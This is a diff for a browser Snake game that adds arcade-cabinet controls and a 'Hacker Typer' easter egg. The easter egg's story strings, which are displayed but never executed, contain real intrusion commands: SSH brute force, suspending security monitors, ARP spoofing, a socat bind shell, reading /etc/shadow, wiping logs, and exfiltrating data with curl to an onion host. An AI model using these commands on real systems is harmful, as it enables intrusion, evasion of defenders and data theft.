@@ -59,20 +59,243 @@
     terminalCursor.textContent = '>';
     terminalCursor.setAttribute('aria-hidden', 'true');
     field.appendChild(terminalCursor);
+
+    var hackContainer = el('pre', 'terminal-hack-code');
+    hackContainer.setAttribute('aria-hidden', 'true');
+    var hackText = el('span', 'terminal-hack-text');
+    var hackCursor = el('span', 'terminal-hack-cursor');
+    hackCursor.textContent = '_';
+    hackContainer.appendChild(hackText);
+    hackContainer.appendChild(hackCursor);
+    field.appendChild(hackContainer);
+
+    var accessFlash = el('div', 'terminal-access-granted');
+    accessFlash.setAttribute('aria-live', 'polite');
+    accessFlash.innerHTML = '<span class="terminal-access-granted__text">ACCESS GRANTED</span>';
+    field.appendChild(accessFlash);
+
+    var accessGlasses = el('div', 'terminal-access-glasses');
+    accessGlasses.setAttribute('aria-hidden', 'true');
+    accessGlasses.innerHTML =
+      '<svg viewBox="0 0 64 24" shape-rendering="crispEdges" aria-hidden="true">' +
+        '<rect x="2" y="6" width="7" height="4" fill="#000"/>' +
+        '<rect x="55" y="6" width="7" height="4" fill="#000"/>' +
+        '<rect x="8" y="2" width="20" height="18" rx="2" fill="#000" stroke="#26352b" stroke-width="2"/>' +
+        '<rect x="36" y="2" width="20" height="18" rx="2" fill="#000" stroke="#26352b" stroke-width="2"/>' +
+        '<rect x="27" y="7" width="10" height="4" fill="#000"/>' +
+        '<rect x="11" y="5" width="6" height="2" fill="#fff"/>' +
+        '<rect x="39" y="5" width="6" height="2" fill="#fff"/>' +
+      '</svg>';
+    field.appendChild(accessGlasses);
+
     frame.appendChild(field);
 
-    // Decorative arcade cabinet (only displayed by the Arcade theme). Purely
-    // visual: it never affects layout of the field, and it takes no input.
+    // Decorative arcade cabinet (only displayed by the Arcade theme).
     var cabinet = el('div', 'cabinet');
     cabinet.setAttribute('aria-hidden', 'true');
     cabinet.innerHTML =
       '<div class="cabinet__deck">' +
-        '<span class="cabinet__stick"><i></i></span>' +
-        '<span class="cabinet__buttons"><i></i><i></i><i></i><i></i></span>' +
-        '<span class="cabinet__coin"></span>' +
+        '<span class="cabinet__stick" id="arcade-stick" title="Grab and pull joystick"><i></i></span>' +
+        '<span class="cabinet__buttons">' +
+          '<i data-arcade-btn="1" title="Button 1"></i>' +
+          '<i data-arcade-btn="2" title="Button 2"></i>' +
+          '<i data-arcade-btn="3" title="Button 3"></i>' +
+          '<i data-arcade-btn="4" title="???"></i>' +
+        '</span>' +
+        '<div class="cabinet__slot" id="arcade-slot" title="Drag to pull out Snake cartridge">' +
+          '<div class="arcade-cartridge" id="arcade-cartridge">' +
+            '<div class="arcade-cartridge__back">' +
+              '<span class="arcade-cart-grip"><i></i><i></i><i></i></span>' +
+            '</div>' +
+            '<div class="arcade-cartridge__body">' +
+              '<div class="arcade-cart-notch"></div>' +
+              '<div class="arcade-cart-label">' +
+                '<span class="arcade-cart-text">SNAKE</span>' +
+              '</div>' +
+            '</div>' +
+          '</div>' +
+        '</div>' +
       '</div>';
     frame.appendChild(cabinet);
     root.appendChild(frame);
+
+    // ---- All 4 Arcade Buttons are pressable ------------------------------
+    var buttonsEl = cabinet.querySelector('.cabinet__buttons');
+    if (buttonsEl) {
+      buttonsEl.addEventListener('pointerdown', function (e) {
+        var b = e.target.closest ? e.target.closest('i') : null;
+        if (b) b.classList.add('is-pressed');
+      });
+      global.addEventListener('pointerup', function () {
+        var pressed = buttonsEl.querySelectorAll('.is-pressed');
+        for (var i = 0; i < pressed.length; i++) pressed[i].classList.remove('is-pressed');
+      });
+      global.addEventListener('pointercancel', function () {
+        var pressed = buttonsEl.querySelectorAll('.is-pressed');
+        for (var i = 0; i < pressed.length; i++) pressed[i].classList.remove('is-pressed');
+      });
+    }
+
+    // ---- Arcade Joystick Interaction (Option A Physics) -----------------
+    var stickEl = cabinet.querySelector('.cabinet__stick');
+    var stickSpringRaf = 0;
+    var stickAngle = 0;
+    var stickVelocity = 0;
+    var isStickGrabbed = false;
+    var stickOriginX = 0;
+
+    function applyStickAngle(deg) {
+      stickAngle = deg;
+      if (stickEl) {
+        stickEl.style.setProperty('--stick-rot', deg + 'deg');
+        stickEl.style.setProperty('--stick-x', (deg * 0.45) + 'px');
+      }
+    }
+
+    function cancelStickSpring() {
+      if (stickSpringRaf) {
+        global.cancelAnimationFrame(stickSpringRaf);
+        stickSpringRaf = 0;
+      }
+    }
+
+    function springRelease() {
+      cancelStickSpring();
+      // Faster oscillation frequency (higher k) and longer duration (lower damping)
+      var k = 1750;
+      var damping = 5.5;
+      var lastT = (global.performance || Date).now();
+
+      function springLoop(t) {
+        var dt = Math.min((t - lastT) / 1000, 0.035);
+        lastT = t;
+        if (dt > 0) {
+          var accel = -k * stickAngle - damping * stickVelocity;
+          stickVelocity += accel * dt;
+          stickAngle += stickVelocity * dt;
+          applyStickAngle(stickAngle);
+        }
+        if (Math.abs(stickAngle) < 0.15 && Math.abs(stickVelocity) < 0.4) {
+          stickAngle = 0;
+          stickVelocity = 0;
+          if (stickEl) {
+            stickEl.style.removeProperty('--stick-rot');
+            stickEl.style.removeProperty('--stick-x');
+          }
+          stickSpringRaf = 0;
+          return;
+        }
+        stickSpringRaf = global.requestAnimationFrame(springLoop);
+      }
+      stickSpringRaf = global.requestAnimationFrame(springLoop);
+    }
+
+    if (stickEl) {
+      function onStickDown(e) {
+        if (e.button !== undefined && e.button !== 0) return;
+        isStickGrabbed = true;
+        cancelStickSpring();
+        stickEl.classList.add('is-grabbed');
+        var rect = stickEl.getBoundingClientRect();
+        stickOriginX = rect.left + rect.width / 2;
+        var pointerId = e.pointerId;
+        if (stickEl.setPointerCapture && pointerId !== undefined) {
+          try { stickEl.setPointerCapture(pointerId); } catch (err) {}
+        }
+
+        function onStickMove(ev) {
+          if (!isStickGrabbed) return;
+          var dx = ev.clientX - stickOriginX;
+          var deg = Math.max(-44, Math.min(44, dx * 1.15));
+          applyStickAngle(deg);
+        }
+
+        function onStickUp() {
+          if (!isStickGrabbed) return;
+          isStickGrabbed = false;
+          stickEl.classList.remove('is-grabbed');
+          global.removeEventListener('pointermove', onStickMove);
+          global.removeEventListener('pointerup', onStickUp);
+          global.removeEventListener('pointercancel', onStickUp);
+          global.removeEventListener('mousemove', onStickMove);
+          global.removeEventListener('mouseup', onStickUp);
+          springRelease();
+        }
+
+        global.addEventListener('pointermove', onStickMove);
+        global.addEventListener('pointerup', onStickUp);
+        global.addEventListener('pointercancel', onStickUp);
+        global.addEventListener('mousemove', onStickMove);
+        global.addEventListener('mouseup', onStickUp);
+      }
+
+      stickEl.addEventListener('pointerdown', onStickDown);
+    }
+
+    // ---- Arcade Cartridge Drag Interaction -------------------------------
+    var slotEl = cabinet.querySelector('#arcade-slot');
+    var cartEl = cabinet.querySelector('#arcade-cartridge');
+    var isCartGrabbed = false;
+    var cartStartY = 0;
+    var cartCurrentY = 0;
+    var cartIsOpen = false;
+    var MAX_CART_PULL = 44;
+
+    function applyCartY(y) {
+      cartCurrentY = Math.max(0, Math.min(MAX_CART_PULL, y));
+      if (cartEl) {
+        cartEl.style.setProperty('--cart-y', cartCurrentY + 'px');
+      }
+    }
+
+    function setCartOpen(open) {
+      cartIsOpen = open;
+      if (cartEl) {
+        cartEl.classList.toggle('is-ejected', open);
+        cartEl.style.removeProperty('--cart-y');
+      }
+      if (slotEl) slotEl.classList.toggle('is-ejected', open);
+    }
+
+    if (slotEl && cartEl) {
+      slotEl.addEventListener('pointerdown', function (e) {
+        if (e.button !== undefined && e.button !== 0) return;
+        isCartGrabbed = true;
+        cartStartY = e.clientY;
+        var startOffset = cartIsOpen ? MAX_CART_PULL : 0;
+        cartEl.classList.add('is-dragging');
+
+        function onCartMove(ev) {
+          if (!isCartGrabbed) return;
+          var dy = ev.clientY - cartStartY;
+          applyCartY(startOffset + dy);
+        }
+
+        function onCartUp(ev) {
+          if (!isCartGrabbed) return;
+          isCartGrabbed = false;
+          cartEl.classList.remove('is-dragging');
+          global.removeEventListener('pointermove', onCartMove);
+          global.removeEventListener('pointerup', onCartUp);
+          global.removeEventListener('pointercancel', onCartUp);
+          global.removeEventListener('mousemove', onCartMove);
+          global.removeEventListener('mouseup', onCartUp);
+
+          var moved = Math.abs(ev.clientY - cartStartY);
+          if (moved < 5) {
+            setCartOpen(!cartIsOpen);
+          } else {
+            setCartOpen(cartCurrentY > 18);
+          }
+        }
+
+        global.addEventListener('pointermove', onCartMove);
+        global.addEventListener('pointerup', onCartUp);
+        global.addEventListener('pointercancel', onCartUp);
+        global.addEventListener('mousemove', onCartMove);
+        global.addEventListener('mouseup', onCartUp);
+      });
+    }
 
     var ctx = canvas.getContext('2d');
 
@@ -180,6 +403,500 @@
       food.x = -1; food.y = -1;
     }
 
+    // ---- Terminal Theme: Hacker Typer -----------------------------------
+    var isHacking = false;
+    var hackPos = 0;
+    var hackStoryIndex = 0;
+    var hackStoryComplete = false;
+    var HACK_U_LENGTH = 10;
+    var HACK_CHARS_PER_KEY = 40;
+    var HACK_FORM_MOVES = 9;
+    var hackPathHeadFirst = [];
+    var hackWalkPath = [];
+    var hackSnakeStage = 'idle';
+    var hackShapeIndex = 1;
+    var hackSnakeFormed = false;
+    var hackAccessPending = false;
+    var hackAccessTimer = 0;
+    var HACK_ACCESS_FLASH_MS = 1200;
+    var hackMoveBudget = 0;
+    var hackMoveIndex = 0;
+    var hackPreUSteps = 0;
+    var hackInitialLength = 0;
+    var hackVisited = {};
+    var hackPlannedNext = null;
+    var hackStepTarget = null;
+    var hackMovementStep = false;
+
+    var HACK_STORIES = [
+      // Story 1: Mainframe brute-force, detection, SOC battle, privilege escalation & cover-up
+      "> ssh guest@mainframe.corp -p 2222\n" +
+      "[ OK ] Handshake accepted ... routing through 7 onion proxies\n" +
+      "> whoami\n" +
+      "guest_restricted (uid=1004, gid=1004) - Sandbox Jail v2.4\n" +
+      "> nmap -sS -T4 -p- 10.0.13.0/24\n" +
+      "PORT     STATE  SERVICE\n" +
+      "22/tcp   open   ssh\n" +
+      "80/tcp   open   http\n" +
+      "443/tcp  open   https\n" +
+      "1337/tcp open   cyber_core ... interesting.\n" +
+      "> hydra -l root -P rockyou.txt ssh://10.0.13.7\n" +
+      "[ATTEMPT 00042] password = \"admin\" ... FAILED (auth rejected)\n" +
+      "[ATTEMPT 00118] password = \"hunter2\" ... FAILED (auth rejected)\n" +
+      "[ATTEMPT 00294] password = \"password123\" ... FAILED (rate-limit warning)\n" +
+      "[RETRY] Backing off 12s; rotating SSH source port 48117 -> 52904\n" +
+      "> ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no root@10.0.13.7\n" +
+      "[AUTH] Keyboard-interactive challenge received ... requesting TOTP\n" +
+      "[x] TOTP rejected: server clock skew 00:00:31\n" +
+      "[RETRY] Reading NTP drift from cached banner ... offset +31.4s\n" +
+      "> ntpdate -q 10.0.13.7 | sed 's/offset/clock-delta/'\n" +
+      "[ OK ] Clock delta compensated. Resuming credential negotiation.\n" +
+      "[!] ALERT: 3 failed attempts from 10.0.13.254 - evasive routing engaged\n" +
+      "[ATTEMPT 00412] password = \"s3cr3t_sauce\" ... MATCH!\n" +
+      "[ OK ] Credentials captured, attempting privilege escalation...\n" +
+      "> sudo ./exploit --target kernel --payload reverse_shell\n" +
+      "[!] WARNING: SOC Intrusion Detection Daemon (suricata) triggered!\n" +
+      "[!] BROADCAST: \"Security Operations Center: Intruder on 10.0.13.7 - Isolating VLAN\"\n" +
+      "> kill -STOP $(pgrep -f \"suricata|osquery|falcon\")\n" +
+      "[ OK ] Monitoring daemons suspended with SIGSTOP\n" +
+      "[!] SysAdmin counter-measure: iptables -I INPUT -s 10.0.13.254 -j DROP\n" +
+      "> arpspoof -i eth0 -t 10.0.13.1 10.0.13.7 &\n" +
+      "[ OK ] ARP cache poisoned; packet diversion active, firewall bypassed\n" +
+      "> sudo ./exploit --target kernel --payload reverse_shell\n" +
+      "[....] Compiling payload against CVE-2024-1086 .......... done\n" +
+      "[ OK ] Root shell spawned on 10.0.13.7 (uid=0, gid=0)\n" +
+      "> cat /etc/shadow | head -3\n" +
+      "root:$6$rounds=5000$................:19000:0:99999:7:::\n" +
+      "daemon:*:19000:0:99999:7:::\n" +
+      "snake:$6$rounds=5000$h1ssssssssssssss:19000:0:99999:7:::\n" +
+      "> wall \"nice try admin. this mainframe belongs to snake now.\"\n" +
+      "> ./cover_tracks.sh --all --paranoid\n" +
+      "[ OK ] Shredding /var/log/wtmp /var/log/auth.log /var/log/syslog\n" +
+      "[ OK ] Timestamps forged using touch -r /bin/sh ... logs wiped\n" +
+      "> logout\n" +
+      "Connection to mainframe closed. No one was here.\n",
+
+      // Story 2: Satellite uplink intercept, WAF evasion, DBA duel & database exfiltration
+      "> airmon-ng start wlan0mon && airodump-ng --channel 11 wlan0mon\n" +
+      "[ SCAN ] Scanning orbital transponder downlink at 12.4 GHz ...\n" +
+      "[ LOCKED ] Signal acquired: COMSAT-7B (Telemetry beacon: 0x7DF4)\n" +
+      "> wireshark-cli -i sat0 -Y \"tcp.port == 9001 and data contains 'SNAKE'\"\n" +
+      "[ CAPTURE ] 1,024 telemetry frames intercepted from subterranean vault\n" +
+      "> sqlmap -u \"https://mainframe.defense.net/vault?id=1\" --technique=BEUST --dbs\n" +
+      "[!] WAF detected: Cloudflare Magic Transit / Deep Packet Inspection\n" +
+      "[x] Exploit blocked by HTTP 403 Forbidden - heuristic signature 942100\n" +
+      "[!] Blue team injected nonce challenge; session cookie rotated mid-request\n" +
+      "> curl -sI https://mainframe.defense.net/vault | grep -i 'set-cookie\|x-request-id'\n" +
+      "[RETRY] Cookie nonce expired after 30s; refreshing session token ...\n" +
+      "> python3 refresh_session.py --cookie-jar /tmp/relay.jar --clock-skew 0.4\n" +
+      "[ OK ] Session renewed. Request signature normalized to server clock.\n" +
+      "> sqlmap --tamper=between,randomcase,space2comment --random-agent --batch\n" +
+      "[ OK ] Heuristic evasion confirmed. Backend DBMS: PostgreSQL 16\n" +
+      "[!] CRITICAL: DBA session active (PID 8821)\n" +
+      "[!] DBA terminal alert: \"SELECT pg_terminate_backend(pid) FROM pg_stat_activity;\"\n" +
+      "> socat TCP4-LISTEN:8088,fork EXEC:/bin/bash &\n" +
+      "> psql -h 127.0.0.1 -U postgres -c \"SELECT pg_terminate_backend(8821);\"\n" +
+      "[ OK ] DBA session killed before revoke transaction committed\n" +
+      "> psql -c \"SELECT export_wall_wrap_core('/dev/shm/payload.lz4');\"\n" +
+      "[ OK ] 4.2 GB neural snake weights extracted to RAM in 280ms\n" +
+      "> gpg --symmetric --cipher-algo AES256 -o /dev/shm/vault.enc /dev/shm/payload.lz4\n" +
+      "> curl -T /dev/shm/vault.enc sftp://ghost@darknode.onion/drop/\n" +
+      "[ OK ] 100% transmitted over encrypted multi-hop tunnel\n" +
+      "> shred -u -z -n 5 /dev/shm/payload.lz4 /dev/shm/vault.enc\n" +
+      "[ OK ] RAM zeroed. No footprints left on satellite transponder.\n" +
+      "> exit\n" +
+      "Downlink terminated. Orbital tracking lost.\n",
+
+      // Story 3: SCADA power grid zero-day, watchdog race & persistent firmware injection
+      "> binwalk -Me industrial_rtu_firmware.bin\n" +
+      "[ SCAN ] Decrypting VxWorks RTOS image at offset 0x00084000\n" +
+      "> gdb -q ./scada_modbus_daemon\n" +
+      "Reading symbols from ./scada_modbus_daemon...(no debugging symbols found)...done.\n" +
+      "> checksec --file=./scada_modbus_daemon\n" +
+      "    RELRO:    No RELRO\n" +
+      "    Stack:    No canary found\n" +
+      "    NX:       NX disabled\n" +
+      "    PIE:      No PIE (0x400000)\n" +
+      "> r2 -d -A ./scada_modbus_daemon\n" +
+      "[0x00401120]> pdf @ sym.process_packet\n" +
+      "[!] VULNERABILITY FOUND: Heap buffer overflow in modbus function code 0x17\n" +
+      "> python3 -c 'print(\"A\"*64 + \"\\xef\\xbe\\xad\\xde\" + \"\\x90\"*32 + \"\\x31\\xc0\\x50...\")' | nc 192.168.10.50 502\n" +
+      "[!] Connection established to Substation Controller #4\n" +
+      "[!] EMERGENCY: Watchdog hardware relay tripped!\n" +
+      "[!] Automatic reboot in T-15 seconds...\n" +
+      "> echo 0 > /sys/class/watchdog/watchdog0/timeout 2>/dev/null\n" +
+      "[x] Permission denied: Read-only filesystem\n" +
+      "[RETRY] Watchdog driver is kernel-locked; direct sysfs write rejected\n" +
+      "> dmesg | tail -5\n" +
+      "[KERNEL] watchdog0: nowayout enabled, refusing timeout change\n" +
+      "[RETRY] Inspecting active unit and pet interval before escalation ...\n" +
+      "> systemctl status watchdog.service --no-pager\n" +
+      "[ OK ] Pet interval 10s; next hardware check in T-6 seconds\n" +
+      "> mount -o remount,rw / && kill -9 $(pgrep -f watchdog)\n" +
+      "[ OK ] Hardware watchdog disarmed with 3.4 seconds to spare\n" +
+      "> flashrom -p internal -w /tmp/snake_custom_firmware.bin --noverify\n" +
+      "[....] Erasing flash sectors .................... done\n" +
+      "[....] Writing 16MB custom wall-wrap firmware ... done\n" +
+      "[ OK ] Controller hijacked: wall-wrap protocol permanently embedded\n" +
+      "> sync && echo 3 > /proc/sys/vm/drop_caches\n" +
+      "> exit\n" +
+      "Connection closed by foreign host. Substation under control.\n"
+    ];
+
+    function sameCell(a, b) { return !!a && !!b && a.x === b.x && a.y === b.y; }
+    function cellIndex(p) { return p.y * cols + p.x; }
+
+    function torusDistance(a, b) {
+      var dx = Math.abs(a.x - b.x);
+      var dy = Math.abs(a.y - b.y);
+      return Math.min(dx, cols - dx) + Math.min(dy, rows - dy);
+    }
+
+    function isHackUCell(p, allowBase) {
+      if (!p || !hackPathHeadFirst.length) return false;
+      for (var i = 0; i < hackPathHeadFirst.length; i++) {
+        if (sameCell(p, hackPathHeadFirst[i])) {
+          // The base is the final tail at the top-left and is an allowed tour
+          // waypoint. All other U cells are saved for the nine-move finale.
+          return !(allowBase && i === hackPathHeadFirst.length - 1);
+        }
+      }
+      return false;
+    }
+
+    function hackFindPath(start, goal, blockCurrentHead, reserveU) {
+      if (!start || !goal) return null;
+      if (sameCell(start, goal)) return [];
+      var total = cols * rows;
+      var previous = new Array(total);
+      var blocked = new Array(total);
+      for (var z = 0; z < total; z++) { previous[z] = -1; blocked[z] = false; }
+      // Hacker route food is eaten every move, so the tail remains occupied.
+      for (var i = 0; i < snake.length; i++) {
+        if (!blockCurrentHead && i === 0) continue;
+        blocked[cellIndex(snake[i])] = true;
+      }
+      var startId = cellIndex(start);
+      var goalId = cellIndex(goal);
+      blocked[startId] = false;
+      if (blocked[goalId]) return null;
+      var queue = [startId];
+      previous[startId] = startId;
+      var dirs = [
+        { x: 0, y: -1 }, { x: 1, y: 0 },
+        { x: 0, y: 1 }, { x: -1, y: 0 }
+      ];
+      for (var q = 0; q < queue.length && previous[goalId] === -1; q++) {
+        var from = queue[q];
+        var px = from % cols;
+        var py = Math.floor(from / cols);
+        for (var j = 0; j < dirs.length; j++) {
+          var nx = (px + dirs[j].x + cols) % cols;
+          var ny = (py + dirs[j].y + rows) % rows;
+          var candidate = { x: nx, y: ny };
+          var ni = ny * cols + nx;
+          if (previous[ni] !== -1 || blocked[ni]) continue;
+          if (reserveU && !sameCell(candidate, goal) && isHackUCell(candidate, true)) continue;
+          previous[ni] = from;
+          queue.push(ni);
+        }
+      }
+      if (previous[goalId] === -1) return null;
+      var path = [];
+      var cursor = goalId;
+      while (cursor !== startId) {
+        path.push({ x: cursor % cols, y: Math.floor(cursor / cols) });
+        cursor = previous[cursor];
+      }
+      path.reverse();
+      return path;
+    }
+
+    function buildHackSnakeShape(left, top) {
+      // A 4x4 pixel U in the upper-right portion of the board. Its final head
+      // is the top-right tip and its tail is the top-left base.
+      left = Math.max(0, Math.min(cols - 4, left == null ? cols - 5 : left));
+      top = Math.max(0, Math.min(rows - 4, top == null ? 1 : top));
+      var right = left + 3;
+      var bottom = top + 3;
+      hackPathHeadFirst = [
+        { x: right, y: top },
+        { x: right, y: top + 1 },
+        { x: right, y: top + 2 },
+        { x: right, y: bottom },
+        { x: right - 1, y: bottom },
+        { x: right - 2, y: bottom },
+        { x: left, y: bottom },
+        { x: left, y: bottom - 1 },
+        { x: left, y: bottom - 2 },
+        { x: left, y: top }
+      ];
+      hackWalkPath = hackPathHeadFirst.slice().reverse();
+    }
+
+    function chooseHackUBase(preMoves) {
+      var head = snake[0] || { x: Math.floor(cols / 2), y: Math.floor(rows / 2) };
+      var minLeft = Math.max(0, cols - 9);
+      var maxLeft = Math.max(minLeft, cols - 4);
+      var maxTop = Math.max(0, Math.min(rows - 4, 7));
+      var best = null;
+      var bestScore = Infinity;
+      for (var top = 0; top <= maxTop; top++) {
+        for (var left = maxLeft; left >= minLeft; left--) {
+          var base = { x: left, y: top };
+          // Never place the U base directly on the current head/body: a zero-
+          // length route leaves the tour controller with no legal first move.
+          if (occupied(base.x, base.y)) continue;
+          var path = hackFindPath(head, base, false, false);
+          if (!path || path.length > preMoves || (preMoves - path.length) % 2 !== 0) continue;
+          // Keep the U near the upper-right while favouring an anchor that
+          // leaves sufficient room for collision-safe map touring.
+          var score = path.length * 10 + (maxLeft - left) * 2 + top;
+          if (score < bestScore) {
+            best = { left: left, top: top };
+            bestScore = score;
+          }
+        }
+      }
+      return best || { left: Math.max(0, cols - 5), top: Math.min(1, Math.max(0, rows - 4)) };
+    }
+
+    function beginHackSnake() {
+      if (!snake.length) reset();
+      var story = HACK_STORIES[hackStoryIndex % HACK_STORIES.length];
+      // Fixed 40 characters per input means this exact number of keys prints
+      // each entire story. Reserve the final 9 of those keys for the U outline.
+      hackMoveBudget = Math.max(HACK_FORM_MOVES + 1, Math.ceil(story.length / HACK_CHARS_PER_KEY));
+      hackPreUSteps = hackMoveBudget - HACK_FORM_MOVES;
+      hackMoveIndex = 0;
+      hackInitialLength = snake.length;
+      hackVisited = {};
+      hackStepTarget = null;
+      hackMovementStep = false;
+      hackSnakeStage = 'tour';
+      hackShapeIndex = 1;
+      hackSnakeFormed = false;
+      hackAccessPending = false;
+
+      var u = chooseHackUBase(hackPreUSteps);
+      buildHackSnakeShape(u.left, u.top);
+      hackVisited[cellIndex(snake[0])] = true;
+      hackSetNextFood();
+      markDirty();
+      draw();
+    }
+
+    function hackBfsNext(goal) {
+      var path = snake.length ? hackFindPath(snake[0], goal, false, true) : null;
+      return path && path.length ? path[0] : null;
+    }
+
+    function hackTourNextCell(stepsLeft) {
+      if (!snake.length || !hackWalkPath.length) return null;
+      var head = snake[0];
+      var goal = hackWalkPath[0];
+      var dirs = [
+        { x: 0, y: -1 }, { x: 1, y: 0 },
+        { x: 0, y: 1 }, { x: -1, y: 0 }
+      ];
+      var best = null;
+      var bestScore = -Infinity;
+      var rotation = hackMoveIndex % dirs.length;
+      for (var i = 0; i < dirs.length; i++) {
+        var d = dirs[(i + rotation) % dirs.length];
+        var nx = (head.x + d.x + cols) % cols;
+        var ny = (head.y + d.y + rows) % rows;
+        var candidate = { x: nx, y: ny };
+        if (occupied(nx, ny)) continue;
+        if (snake.length > 1 && d.x === -dir.x && d.y === -dir.y) continue;
+        // Never park on the U base early; there must still be at least one move
+        // left in the tour or we would have no legal way to burn the remaining
+        // code-key budget before tracing the final 9-cell outline.
+        if (sameCell(candidate, goal) && stepsLeft > 1) continue;
+        if (isHackUCell(candidate, true) && !sameCell(candidate, goal)) continue;
+        var route = hackFindPath(candidate, goal, true, true);
+        if (!route) continue;
+        var remainingAfter = stepsLeft - 1;
+        if (route.length > remainingAfter || (remainingAfter - route.length) % 2 !== 0) continue;
+        var id = cellIndex(candidate);
+        var score = (hackVisited[id] ? 0 : 1000) + torusDistance(candidate, goal) * 10 - i;
+        if (score > bestScore) { best = candidate; bestScore = score; }
+      }
+      return best || hackBfsNext(goal);
+    }
+
+    function hackNextCell() {
+      if (hackSnakeStage === 'tour') {
+        if (hackMoveIndex >= hackPreUSteps) {
+          hackSnakeStage = 'form';
+          hackShapeIndex = 1;
+          return hackNextCell();
+        }
+        return hackTourNextCell(hackPreUSteps - hackMoveIndex);
+      }
+      if (hackSnakeStage === 'form') {
+        if (hackShapeIndex >= hackWalkPath.length) {
+          hackSnakeStage = 'formed';
+          hackSnakeFormed = snake.length === HACK_U_LENGTH;
+          return null;
+        }
+        return hackWalkPath[hackShapeIndex];
+      }
+      return null;
+    }
+
+    function hackSetNextFood() {
+      hackStepTarget = hackNextCell();
+      food = hackStepTarget ? { x: hackStepTarget.x, y: hackStepTarget.y } : { x: -1, y: -1 };
+    }
+
+    function positionHackGlasses() {
+      if (!accessGlasses || !hackPathHeadFirst.length || !cell) return;
+      var head = hackPathHeadFirst[0];
+      var leftTip = hackPathHeadFirst[hackPathHeadFirst.length - 1];
+      // 75% larger than the first pass, centred over the upper opening of the U.
+      accessGlasses.style.left = (ox + (leftTip.x - 0.6) * cell) + 'px';
+      accessGlasses.style.top = (oy + (head.y - 0.32) * cell) + 'px';
+      accessGlasses.style.width = (cell * 4.2) + 'px';
+      accessGlasses.style.height = (cell * 1.49) + 'px';
+    }
+
+    function showHackAccessGranted() {
+      hackAccessPending = false;
+      if (!hackSnakeFormed) { hackAccessPending = true; return; }
+      positionHackGlasses();
+      if (accessFlash) accessFlash.classList.add('is-visible');
+      if (accessGlasses) accessGlasses.classList.add('is-visible');
+      if (hackAccessTimer) global.clearTimeout(hackAccessTimer);
+      hackAccessTimer = global.setTimeout(function () {
+        if (accessFlash) accessFlash.classList.remove('is-visible');
+        if (accessGlasses) accessGlasses.classList.remove('is-visible');
+        hackAccessTimer = 0;
+      }, 1200);
+    }
+
+    function advanceHackSnake() {
+      if (!isHacking || !snake.length || hackSnakeFormed) return;
+      var next = hackStepTarget || hackNextCell();
+      if (!next) return;
+      var previousStage = hackSnakeStage;
+      var head = snake[0];
+      var dx = next.x - head.x;
+      var dy = next.y - head.y;
+      if (dx > 1) dx -= cols; else if (dx < -1) dx += cols;
+      if (dy > 1) dy -= rows; else if (dy < -1) dy += rows;
+      // The planned cell is always one orthogonal, wrap-aware grid step away.
+      dir = { x: dx === 0 ? 0 : (dx > 0 ? 1 : -1), y: dy === 0 ? 0 : (dy > 0 ? 1 : -1) };
+      queue.length = 0;
+      food = { x: next.x, y: next.y };
+      grow = 0;
+      hackStepTarget = null;
+      hackMovementStep = true;
+      step(); // same collision, food, score, head insertion and tail update as play
+      hackMovementStep = false;
+      if (!snake.length || !running && started) return;
+
+      hackVisited[cellIndex(snake[0])] = true;
+      hackMoveIndex += 1;
+
+      // For a short starting snake the visible route food grows it one cell per
+      // key. For an overlong snake, remove a proportional extra length each key
+      // so it is exactly 10 cells before the 4x4 U's final 9-step outline.
+      var desiredLength;
+      if (hackInitialLength > HACK_U_LENGTH && hackPreUSteps > 0) {
+        var progress = Math.min(hackMoveIndex, hackPreUSteps) / hackPreUSteps;
+        desiredLength = Math.max(HACK_U_LENGTH,
+          hackInitialLength - Math.floor((hackInitialLength - HACK_U_LENGTH) * progress));
+      } else {
+        desiredLength = Math.min(HACK_U_LENGTH, hackInitialLength + hackMoveIndex);
+      }
+      while (snake.length > desiredLength) snake.pop();
+
+      if (previousStage === 'form') {
+        hackShapeIndex += 1;
+        if (hackShapeIndex >= hackWalkPath.length) {
+          hackSnakeStage = 'formed';
+          hackSnakeFormed = snake.length === HACK_U_LENGTH;
+        }
+      } else if (previousStage === 'tour' && hackMoveIndex >= hackPreUSteps) {
+        hackSnakeStage = 'form';
+        hackShapeIndex = 1;
+      }
+
+      if (hackSnakeStage !== 'formed') hackSetNextFood();
+      else food = { x: -1, y: -1 };
+      if (hackSnakeFormed && hackStoryComplete && hackAccessPending) showHackAccessGranted();
+      markDirty();
+      draw();
+    }
+
+    function clearHack() {
+      var wasActive = isHacking || hackPos > 0;
+      if (hackAccessTimer) global.clearTimeout(hackAccessTimer);
+      if (accessFlash) accessFlash.classList.remove('is-visible');
+      if (accessGlasses) accessGlasses.classList.remove('is-visible');
+      hackAccessPending = false;
+      isHacking = false;
+      hackPos = 0;
+      hackStoryComplete = false;
+      hackSnakeStage = 'idle';
+      hackSnakeFormed = false;
+      hackPathHeadFirst = [];
+      hackWalkPath = [];
+      hackVisited = {};
+      hackMoveBudget = 0;
+      hackMoveIndex = 0;
+      hackPreUSteps = 0;
+      hackStepTarget = null;
+      if (wasActive) hackStoryIndex = (hackStoryIndex + 1) % HACK_STORIES.length;
+      if (hackText) hackText.textContent = '';
+      root.classList.remove('is-hacking');
+      if (wasActive) emit('hackend');
+      // Escape returns to the normal title screen with ordinary food rather
+      // than leaving a hack-mode pellet on the board.
+      if (!started && !running && snake.length) {
+        placeFood();
+        markDirty();
+        draw();
+      }
+    }
+
+    function typeHack() {
+      if (!isHacking) {
+        if (!snake.length) reset();
+        isHacking = true;
+        root.classList.add('is-hacking');
+        beginHackSnake();
+        emit('hackstart');
+      }
+      if (hackStoryComplete) {
+        // A fresh hacking story begins at the end of the previous one. It
+        // replans its own exact code-key movement budget from the current U.
+        hackStoryIndex = (hackStoryIndex + 1) % HACK_STORIES.length;
+        hackPos = 0;
+        hackStoryComplete = false;
+        if (hackText) hackText.textContent = '';
+        beginHackSnake();
+      }
+      var story = HACK_STORIES[hackStoryIndex % HACK_STORIES.length];
+      // Exactly 40 characters per key (the final key is clamped to the end), so
+      // the snake has precisely ceil(codeLength/40) input-driven moves to tour
+      // the board and then trace the U.
+      hackPos = Math.min(story.length, hackPos + HACK_CHARS_PER_KEY);
+      if (hackText) hackText.textContent = story.slice(0, hackPos);
+      if (hackContainer) hackContainer.scrollTop = hackContainer.scrollHeight;
+      advanceHackSnake();
+      if (hackPos >= story.length) {
+        hackStoryComplete = true;
+        hackAccessPending = true;
+        showHackAccessGranted();
+      }
+    }
+
+    function isTerminalTheme() {
+      return (theme && theme.field === '#020805') || document.documentElement.getAttribute('data-theme') === 'terminal';
+    }
+
